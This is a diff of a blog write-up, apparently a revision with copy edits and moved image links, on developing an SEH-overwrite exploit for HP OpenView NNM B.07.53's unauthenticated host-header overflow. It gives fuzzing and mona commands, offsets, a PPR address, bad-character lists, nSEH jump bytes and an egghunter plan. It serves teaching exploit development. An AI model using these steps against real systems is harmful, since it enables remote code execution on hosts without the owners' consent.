+<p>It is observed that <code>ova.exe</code> process is responsible for listening to the network connection on <code>TCP</code> port <code>7150</code>.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/ovas_process.png" alt="ovas-process" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/ovas_process.png" alt="ovas-process" /></p>
 
 <h2>Crash</h2>
 
@@ -4374,22 +4372,21 @@
 
 <p>Start fuzzing  the <code>http.spk</code> template through <code>Spike</code> fuzzer.</p>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>generic_send_tcp 172.16.116.198 <span class="m">7510</span> http.spk <span class="m">0</span> 0
-</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>generic_send_tcp 172.16.116.198 7510 http.spk 0 0</span></code></pre></td></tr></table></div></figure>
 
 
 <p>It is observed that while fuzzing the <code>host</code> header, application crashes.</p>
 
-<p>Verify and confirm the same by inspecting the <code>host header</code> in memory dump.</p>
+<p>Verify and confirm the same by inspecting the <code>host header</code> in the memory dump.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/crash.png" alt="crash" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/crash.png" alt="crash" /></p>
 
-<h4>Analysing the crash scenario</h4>
+<h4>Analyzing the crash scenario</h4>
 
 <ul>
 <li><code>SEH</code> and <code>nSEH</code> both are overwritten by fuzz buffer <code>A</code>.</li>
-<li>It is possible to control / overwrite the <code>EIP</code> after passing the exception to the program.</li>
+<li>It is possible to control/overwrite the <code>EIP</code> after passing the exception to the program.</li>
 <li><code>ESP + 0x4C</code> points at the 1025<sup>th</sup> byte of our fuzz buffer.</li>
 <li>Approximate <code>2048 bytes</code> buffer causes this crash.</li>
 </ul>
@@ -4397,7 +4394,7 @@
 
 <h2>The Bug</h2>
 
-<p>HP OpenView NNM - <code>B.07.53</code> does not validate the <code>host</code> header while processing any <code>un-authenticated</code> HTTP request. As a result, an attacker can  overwrite the <code>SEH chain</code> by sending a large crafted buffer and hijack the execution flow.</p>
+<p>HP OpenView NNM - <code>B.07.53</code> does not validate the <code>host</code> header while processing any <code>un-authenticated</code> HTTP request. As a result, an attacker can overwrite the <code>SEH chain</code> by sending a sizeable crafted buffer and hijack the execution flow.</p>
 
 <h2>Proof Of Concept</h2>
 
@@ -4405,12 +4402,11 @@
 
 <p>Set up the working directory for  <code>mona.py</code>.</p>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>!mona config -set workingfolder c:<span class="se">\m</span>ona-logs<span class="se">\%</span>p
-</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>!mona config -set workingfolder c:\mona-logs\%p</span></code></pre></td></tr></table></div></figure>
 
 
-<p>Send the <code>2048 bytess</code> buffer to verify and reproduce the same crash with a stand alone python script.</p>
+<p>Send the <code>2048 bytes</code> buffer to verify and reproduce the same crash with a stand-alone python script.</p>
 
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -4485,9 +4481,9 @@
 
 <h2>Best Buffer Length</h2>
 
-<p>Try to play with different buffer lengths to figure out the <code>maximum length</code>of the fuzz buffer which produces exactly <code>same</code> crash.</p>
+<p>Try to play with different buffer lengths to figure out the <code>maximum length</code>of the fuzz buffer, which produces the <code>same</code> crash.</p>
 
-<p>After analysing different crashes, it is obeserved that <code>3780 bytes</code> buffer can be a good choice.</p>
+<p>After analyzing different crashes, it is observed that <code>3780 bytes</code> buffer can be the right choice.</p>
 
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -4564,9 +4560,8 @@
 
 <p>Create <code>3780 bytes</code> unique pattern through <code>mona.py</code>.</p>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>!mona pattern_create 3780
-</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>!mona pattern_create 3780</span></code></pre></td></tr></table></div></figure>
 
 
 <p>Then copy those bytes from <code>C:\mona-logs\ovas\pattern.txt</code> and update the skeleton code.</p>
@@ -4726,9 +4721,9 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>During the crash, inspect the <code>SEH chain</code>  and select the <code>first corrupted-entry</code> and then follow address in the stack.</p>
+<p>During the crash, inspect the <code>SEH chain</code>  and select the <code>first corrupted-entry</code> and then follow the address in the stack.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/overflow_seh_chain.png" alt="overflow_seh_chain" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/overflow_seh_chain.png" alt="overflow_seh_chain" /></p>
 
 <p>It is observed that</p>
 
@@ -4746,9 +4741,9 @@
 </ul>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/seh_offset_found.png" alt="seh_offset_found" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/seh_offset_found.png" alt="seh_offset_found" /></p>
 
-<p>To verify those offsets, divide the original buffer into four different blocks - <code>A</code>, <code>B</code>, <code>C</code>, <code>D</code> and update the skeleton code with those identified offset values.</p>
+<p>To verify those offsets, divide the original buffer into four different blocks - <code>A</code>, <code>B</code>, <code>C</code>, <code>D</code>, and update the skeleton code with those identified offset values.</p>
 
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -4839,26 +4834,25 @@
 
 <p>During the crash, the entire buffer is laid in memory in our expected way.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/verify_seh_offset.png" alt="verify_seh_offset" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/verify_seh_offset.png" alt="verify_seh_offset" /></p>
 
-<p>Calculate the length of <code>D</code> buffer = <code>464 bytess</code>.</p>
+<p>Calculate the length of <code>D</code> buffer = <code>464 bytes</code>.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/d_block_length.png" alt="d_block_length" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/d_block_length.png" alt="d_block_length" /></p>
 
-<p><em>Even if we have identified the maximum buffer length but still this length is too small to accommodate an encoded version of final payload.</em></p>
+<blockquote><p>Even if we have identified the maximum buffer length, this length is too small to accommodate an encoded version of the final payload.</p></blockquote>
 
 <h2><code>POP</code> <code>POP</code> <code>RET</code></h2>
 
 <p>Try to identify which modules are not compiled with <code>SafeSEH</code> and <code>ASLR</code>.</p>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>!mona nosafesehaslr
-</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>!mona nosafesehaslr</span></code></pre></td></tr></table></div></figure>
 
 
 <p>There are plenty of options.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/nosafesehaslr.png" alt="mona output - nosafesehaslr" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/nosafesehaslr.png" alt="mona output - nosafesehaslr" /></p>
 
 <p>Select <code>jvm.dll</code> module and pick up a <code>PPR</code> address => <code>0x6D6FA245</code></p>
 
@@ -4868,7 +4862,7 @@
 </ul>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/jvm.dll_ppr_address.png" alt="ppr address from jvm.dll" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/jvm.dll_ppr_address.png" alt="ppr address from jvm.dll" /></p>
 
 <p>Update the skeleton code in little endian order = <code>\x45\xa2\x6f\x6d</code>.</p>
 
@@ -4965,40 +4959,39 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>After that, set up a breakpoint at <code>0x6D6FA245</code> to verify if is possible to land on that address during the crash.</p>
+<p>After that, set up a breakpoint at <code>0x6D6FA245</code> to verify if it is possible to land on that address during the crash.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/breakpoint_0x6d6e394a.png" alt="breakpoint_0x6d6e394a.png" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/breakpoint_0x6d6e394a.png" alt="breakpoint_0x6d6e394a.png" /></p>
 
 <p>However during the crash, when we pass the exception to the program, the <code>SEH</code> address is mangled into <code>0xA2BEEF45</code></p>
 
 <p>little endian order: <code>\x45\xef\xbe\xa2</code></p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/ppr_addr_6d6fa245_mangled.png" alt="mangled ppr address" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/ppr_addr_6d6fa245_mangled.png" alt="mangled ppr address" /></p>
 
-<p>It looks like some character translation / filtering is applied on the buffer. Due to this, we now need to find a <strong>bad char friendly</strong> <code>PPR</code> address.</p>
+<p>It looks like some character translation/filtering is applied to the buffer. Due to this, we now need to find a <strong>bad char friendly</strong> <code>PPR</code> address.</p>
 
 <h2>Bad &amp; Good Characters</h2>
 
-<p>Use <a href="https://github.com/greyshell/Penetration-Test/tree/master/badchar_detection_automated">badchar_detection_HPNNM_B.07.53.py</a> to identify all <code>good</code> and <code>bad</code> characters in a automated fashion.</p>
+<p>Use <a href="https://github.com/greyshell/Penetration-Test/tree/master/badchar_detection_automated">badchar_detection_HPNNM_B.07.53.py</a> to identify all <code>good</code> and <code>bad</code> characters in an automated fashion.</p>
 
 <h5>Script result</h5>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
 <span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># good chars</span>
-</span><span class='line'><span class="se">\x</span>01<span class="se">\x</span>02<span class="se">\x</span>03<span class="se">\x</span>04<span class="se">\x</span>05<span class="se">\x</span>06<span class="se">\x</span>07<span class="se">\x</span>08<span class="se">\x</span>09<span class="se">\x</span>0b<span class="se">\x</span>0c<span class="se">\x</span>0e<span class="se">\x</span>0f<span class="se">\x</span>10<span class="se">\x</span>11<span class="se">\x</span>12<span class="se">\x</span>13<span class="se">\x</span>14<span class="se">\x</span>15<span class="se">\x</span>16<span class="se">\x</span>17<span class="se">\x</span>18<span class="se">\x</span>19<span class="se">\x</span>1a<span class="se">\x</span>1b<span class="se">\x</span>1c<span class="se">\x</span>1d<span class="se">\x</span>1e<span class="se">\x</span>1f<span class="se">\x</span>20<span class="se">\x</span>21<span class="se">\x</span>22<span class="se">\x</span>23<span class="se">\x</span>24<span class="se">\x</span>25<span class="se">\x</span>26<span class="se">\x</span>27<span class="se">\x</span>28<span class="se">\x</span>29<span class="se">\x</span>2a<span class="se">\x</span>2b<span class="se">\x</span>2c<span class="se">\x</span>2d<span class="se">\x</span>2e<span class="se">\x</span>30<span class="se">\x</span>31<span class="se">\x</span>32<span class="se">\x</span>33<span class="se">\x</span>34<span class="se">\x</span>35<span class="se">\x</span>36<span class="se">\x</span>37<span class="se">\x</span>38<span class="se">\x</span>39<span class="se">\x</span>3b<span class="se">\x</span>3c<span class="se">\x</span>3d<span class="se">\x</span>3e<span class="se">\x</span>41<span class="se">\x</span>42<span class="se">\x</span>43<span class="se">\x</span>44<span class="se">\x</span>45<span class="se">\x</span>46<span class="se">\x</span>47<span class="se">\x</span>48<span class="se">\x</span>49<span class="se">\x</span>4a<span class="se">\x</span>4b<span class="se">\x</span>4c<span class="se">\x</span>4d<span class="se">\x</span>4e<span class="se">\x</span>4f<span class="se">\x</span>50<span class="se">\x</span>51<span class="se">\x</span>52<span class="se">\x</span>53<span class="se">\x</span>54<span class="se">\x</span>55<span class="se">\x</span>56<span class="se">\x</span>57<span class="se">\x</span>58<span class="se">\x</span>59<span class="se">\x</span>5a<span class="se">\x</span>5b<span class="se">\x</span>5c<span class="se">\x</span>5d<span class="se">\x</span>5e<span class="se">\x</span>5f<span class="se">\x</span>60<span class="se">\x</span>61<span class="se">\x</span>62<span class="se">\x</span>63<span class="se">\x</span>64<span class="se">\x</span>65<span class="se">\x</span>66<span class="se">\x</span>67<span class="se">\x</span>68<span class="se">\x</span>69<span class="se">\x</span>6a<span class="se">\x</span>6b<span class="se">\x</span>6c<span class="se">\x</span>6d<span class="se">\x</span>6e<span class="se">\x</span>6f<span class="se">\x</span>70<span class="se">\x</span>71<span class="se">\x</span>72<span class="se">\x</span>73<span class="se">\x</span>74<span class="se">\x</span>75<span class="se">\x</span>76<span class="se">\x</span>77<span class="se">\x</span>78<span class="se">\x</span>79<span class="se">\x</span>7a<span class="se">\x</span>7b<span class="se">\x</span>7c<span class="se">\x</span>7d<span class="se">\x</span>7e<span class="se">\x</span>7f
+</pre></td><td class='code'><pre><code class=''><span class='line'># good chars
+</span><span class='line'>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f
 </span><span class='line'>
-</span><span class='line'><span class="c"># bad chars</span>
-</span><span class='line'><span class="se">\x</span>00<span class="se">\x</span>0a<span class="se">\x</span>0d<span class="se">\x</span>2f<span class="se">\x</span>3a<span class="se">\x</span>3f<span class="se">\x</span>40<span class="se">\x</span>80<span class="se">\x</span>81<span class="se">\x</span>82<span class="se">\x</span>83<span class="se">\x</span>84<span class="se">\x</span>85<span class="se">\x</span>86<span class="se">\x</span>87<span class="se">\x</span>88<span class="se">\x</span>89<span class="se">\x</span>8a<span class="se">\x</span>8b<span class="se">\x</span>8c<span class="se">\x</span>8d<span class="se">\x</span>8e<span class="se">\x</span>8f<span class="se">\x</span>90<span class="se">\x</span>91<span class="se">\x</span>92<span class="se">\x</span>93<span class="se">\x</span>94<span class="se">\x</span>95<span class="se">\x</span>96<span class="se">\x</span>97<span class="se">\x</span>98<span class="se">\x</span>99<span class="se">\x</span>9a<span class="se">\x</span>9b<span class="se">\x</span>9c<span class="se">\x</span>9d<span class="se">\x</span>9e<span class="se">\x</span>9f<span class="se">\x</span>a0<span class="se">\x</span>a1<span class="se">\x</span>a2<span class="se">\x</span>a3<span class="se">\x</span>a4<span class="se">\x</span>a5<span class="se">\x</span>a6<span class="se">\x</span>a7<span class="se">\x</span>a8<span class="se">\x</span>a9<span class="se">\x</span>aa<span class="se">\x</span>ab<span class="se">\x</span>ac<span class="se">\x</span>ad<span class="se">\x</span>ae<span class="se">\x</span>af<span class="se">\x</span>b0<span class="se">\x</span>b1<span class="se">\x</span>b2<span class="se">\x</span>b3<span class="se">\x</span>b4<span class="se">\x</span>b5<span class="se">\x</span>b6<span class="se">\x</span>b7<span class="se">\x</span>b8<span class="se">\x</span>b9<span class="se">\x</span>ba<span class="se">\x</span>bb<span class="se">\x</span>bc<span class="se">\x</span>bd<span class="se">\x</span>be<span class="se">\x</span>bf<span class="se">\x</span>c0<span class="se">\x</span>c1<span class="se">\x</span>c2<span class="se">\x</span>c3<span class="se">\x</span>c4<span class="se">\x</span>c5<span class="se">\x</span>c6<span class="se">\x</span>c7<span class="se">\x</span>c8<span class="se">\x</span>c9<span class="se">\x</span>ca<span class="se">\x</span>cb<span class="se">\x</span>cc<span class="se">\x</span>cd<span class="se">\x</span>ce<span class="se">\x</span>cf<span class="se">\x</span>d0<span class="se">\x</span>d1<span class="se">\x</span>d2<span class="se">\x</span>d3<span class="se">\x</span>d4<span class="se">\x</span>d5<span class="se">\x</span>d6<span class="se">\x</span>d7<span class="se">\x</span>d8<span class="se">\x</span>d9<span class="se">\x</span>da<span class="se">\x</span>db<span class="se">\x</span>dc<span class="se">\x</span>dd<span class="se">\x</span>de<span class="se">\x</span>df<span class="se">\x</span>e0<span class="se">\x</span>e1<span class="se">\x</span>e2<span class="se">\x</span>e3<span class="se">\x</span>e4<span class="se">\x</span>e5<span class="se">\x</span>e6<span class="se">\x</span>e7<span class="se">\x</span>e8<span class="se">\x</span>e9<span class="se">\x</span>ea<span class="se">\x</span>eb<span class="se">\x</span>ec<span class="se">\x</span>ed<span class="se">\x</span>ee<span class="se">\x</span>ef<span class="se">\x</span>f0<span class="se">\x</span>f1<span class="se">\x</span>f2<span class="se">\x</span>f3<span class="se">\x</span>f4<span class="se">\x</span>f5<span class="se">\x</span>f6<span class="se">\x</span>f7<span class="se">\x</span>f8<span class="se">\x</span>f9<span class="se">\x</span>fa<span class="se">\x</span>fb<span class="se">\x</span>fc<span class="se">\x</span>fd<span class="se">\x</span>fe<span class="se">\x</span>ff
-</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'># bad chars
+</span><span class='line'>\x00\x0a\x0d\x2f\x3a\x3f\x40\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/output_bad_char_script.png" alt="detect-bad-char-HPNNM-B.07.53.py output" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/output_bad_char_script.png" alt="detect-bad-char-HPNNM-B.07.53.py output" /></p>
 
-<blockquote><p>During crash, <code>ESP + 0x4c</code> pointed at the <code>1025</code>-th bytes of the fuzz buffer.</p></blockquote>
+<blockquote><p>During the crash, <code>ESP + 0x4c</code> pointed at the <code>1025</code>-the bytes of the fuzz buffer.</p></blockquote>
 
 <h5>Algorithm</h5>
 
@@ -5038,13 +5031,13 @@
 
 <p>Run <a href="https://github.com/greyshell/Penetration-Test/tree/master/find_safe_address">find_safe_address.py</a> to identify all safe <code>PPR</code> address from <code>seh.txt</code>.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/output_finding_safe_ppr.png" alt="finding-safe-ppr.py output" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/output_finding_safe_ppr.png" alt="finding-safe-ppr.py output" /></p>
 
 <p>Pick up the first address - <code>0x6d6e394a</code> and set up a breakpoint to verify that.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/breakpoint_0x6d6e394a.png" alt="breakpoint at 0x6d6e394a" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/breakpoint_0x6d6e394a.png" alt="breakpoint at 0x6d6e394a" /></p>
 
-<p>Run the following exploit code updated with <code>safe PPR</code> address.</p>
+<p>Run the following exploit code updated with a <code>safe PPR</code> address.</p>
 
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -5141,27 +5134,27 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>As expected, this time that address does not mangle during crash.</p>
+<p>As expected, this time, that address does not mangle during the crash.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/0x6d6e394a_not_mangled.png" alt="0x6d6e394a did not mangled during crash" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/0x6d6e394a_not_mangled.png" alt="0x6d6e394a did not mangled during crash" /></p>
 
 <p>Pass the exception and land on the breakpoint.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/land_to_ppr_0x6d6e394a.png" alt="land into 0x6d6e394a" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/land_to_ppr_0x6d6e394a.png" alt="land into 0x6d6e394a" /></p>
 
 <p>Step through <code>POP POP RET</code> and finally jump into <code>nSEH</code>.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/jump_nseh.png" alt="reach to nseh" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/jump_nseh.png" alt="reach to nseh" /></p>
 
 <h2>Jump Over <code>SEH</code></h2>
 
-<p>In <code>nSEH</code>, we can&rsquo;t directly write a <code>4</code> byte <code>jump code</code> to meet <code>D</code> buffer. Because the <code>short jump</code> opcode (<code>\xeb</code>) is a bad char.</p>
+<p>In <code>nSEH</code>, we can&rsquo;t directly write a <code>4</code> byte <code>jump code</code> to meet <code>D</code> buffer because the <code>short jump</code> opcode (<code>\xeb</code>) is a bad char.</p>
 
-<p>Now we need to identify all the safe instructions from our <code>good_char.txt</code>.</p>
+<p>Now we need to identify all <code>safe</code> instructions from our <code>good_char.txt</code>.</p>
 
-<p>Run <a href="https://github.com/greyshell/Penetration-Test/tree/master/find_safe_opcode">find_safe_opcode.py</a> and identify all safe instructions. From there find that <code>conditional jump</code> instructions are safe to execute.</p>
+<p>Run <a href="https://github.com/greyshell/Penetration-Test/tree/master/find_safe_opcode">find_safe_opcode.py</a> and identify all <code>safe</code> instructions. From there, find that <code>conditional jump</code> instructions are safe to execute.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/safe_opcode_JA.png" alt="finding safe opcode JA" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/safe_opcode_JA.png" alt="finding safe opcode JA" /></p>
 
 <p>Conditional jump <code>JA</code> (<code>\x77</code>) occurs when</p>
 
@@ -5171,30 +5164,29 @@
 </ul>
 
 
-<p>So if we want to jump <code>4 bytes</code> (i.e. <code>\x04</code> is a safe character) then the opcode will be <code>\x77\x04</code></p>
+<p>So if we want to jump <code>4 bytes</code> (i.e. <code>\x04</code> is a safe character), then the opcode <code>is \x77\x04</code></p>
 
 <p>Now at crash point, it is noticed that <code>ZF = 1</code> and <code>CF = 0</code>.</p>
 
-<p>To make <code>ZF = 0</code> and to satisfy the jump condition, we can perform a operation that produces a non zero result (i.e decrease the  <code>EAX</code> register)</p>
+<p>To make <code>ZF = 0</code> and to satisfy the jump condition, we can perform an operation that produces a non zero result (i.e., decrease the  <code>EAX</code> register)</p>
 
 <ul>
 <li><code>DEC EAX</code> => opcode  <code>\x48</code> is a safe char</li>
 </ul>
 
 
-<blockquote><p>To satisfy the flag condition (<code>ZF = 0</code>), decreasing  the <code>EAX</code> register <code>1</code> time is sufficient.
-However, <code>opcode</code> for this instruction is <code>one byte</code> so we need to fill the another byte with a value (in the stack it will be interpreted as an instruction) that does not impact the <code>ZF</code> flag.
+<blockquote><p>To satisfy the flag condition (<code>ZF = 0</code>), decreasing the <code>EAX</code> register <code>1</code> time is sufficient.
+However, <code>opcode</code> for this instruction is <code>one byte</code>, so we need to fill another byte with a value (in the stack it gets interpreted as an instruction) that does not impact the <code>ZF</code> flag.
 Due to this, we can use <code>DEC EAX</code> => <code>\x48</code> another time as it does not change the <code>ZF</code> flag.</p></blockquote>
 
 <p>Select the jump offset = <code>\x04</code> to jump over <code>SEH</code> and meet the <code>D</code> buffer.</p>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># 1035FE34   48               DEC EAX</span>
-</span><span class='line'><span class="c"># 1035FE35   48               DEC EAX</span>
-</span><span class='line'><span class="c"># 1035FE36   77 04            JA SHORT 1035FE59</span>
-</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class=''><span class='line'># 1035FE34   48               DEC EAX
+</span><span class='line'># 1035FE35   48               DEC EAX
+</span><span class='line'># 1035FE36   77 04            JA SHORT 1035FE59</span></code></pre></td></tr></table></div></figure>
 
 
 <p>Update the skeleton code to overwrite <code>nSEH</code> with <code>\x48\x48\x77\x04</code> and set a break point at <code>0x6d6e394a</code>.</p>
@@ -5302,9 +5294,9 @@ Due to this, we can use <code>DEC EAX</code> => <code>\x48</code> another time a
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>You can see, during crash, breakpoint is hit and after stepping through <code>POP POP RET</code>, control goes to the <code>nSEH</code>. After that it executes all instructions stored on <code>nSEH</code> and finally jumps forward <code>4 bytes</code> and meet <code>D</code> buffer block.</p>
+<p>You can see, during the crash, the breakpoint is hit, and after stepping through <code>POP POP RET</code>, control goes to the <code>nSEH</code>. After that, it executes all instructions stored on <code>nSEH</code> and finally jumps forward <code>4 bytes</code> and meet <code>D</code> buffer block.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/jump_over_seh.png" alt="jump over seh" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/jump_over_seh.png" alt="jump over seh" /></p>
 
 <h2>Egghunter</h2>
 
@@ -5313,7 +5305,7 @@ Due to this, we can use <code>DEC EAX</code> => <code>\x48</code> another time a
 <h5>Problem</h5>
 
 <ul>
-<li>This <code>D</code> buffer suffers from character translation. Due to this, we can&rsquo;t directly write any shellcode / payload here.</li>
+<li>This <code>D</code> buffer suffers from character translation. Due to this, we can&rsquo;t directly write any shellcode/payload here.</li>
 <li>Again if we use any existing encoder from <code>msfvenom</code>  after eliminating all those bad characters, then the final payload size will be huge.</li>
 </ul>
 
@@ -5321,7 +5313,7 @@ Due to this, we can use <code>DEC EAX</code> => <code>\x48</code> another time a
 <h5>Solution</h5>
 
 <ul>
-<li>We can choose a smaller stage 1 payload such as <code>32</code> bytes egghunter.</li>
+<li>We can choose a smaller stage 1 payload, such as <code>32</code> bytes egghunter.</li>
 <li>We can use a <code>custom encoder</code> that generates less than <code>464</code> bytes output for the <code>32</code> byte egghunter code.</li>
 <li>We can write the original shellcode somewhere in the memory that has more space.</li>
 </ul>
@@ -5329,74 +5321,70 @@ Due to this, we can use <code>DEC EAX</code> => <code>\x48</code> another time a
 
 <h2><code>Alphanum</code> Encoder</h2>
 
-<p>Use <code>mona.py</code> <code>alphanum</code> encoder to encode <code>32 bytes</code> <code>egghunter</code> payload. This encoder uses only  <code>AND</code>, <code>SUB</code>, <code>PUSH</code> operations during the encoding process and those instructions are bad character friendly.</p>
+<p>Use <code>mona.py</code> <code>alphanum</code> encoder to encode <code>32 bytes</code> <code>egghunter</code> payload. This encoder uses only  <code>AND</code>, <code>SUB</code>, <code>PUSH</code> operations during the encoding process, and those instructions are bad characters friendly.</p>
 
-<p>We need to choose a egg marker and that needs to be bad character friendly as well.</p>
+<p>We need to choose an egg marker, and that needs to be bad character friendly as well.</p>
 
 <p>lets choose egg_marker =  <code>T00wT00W</code></p>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
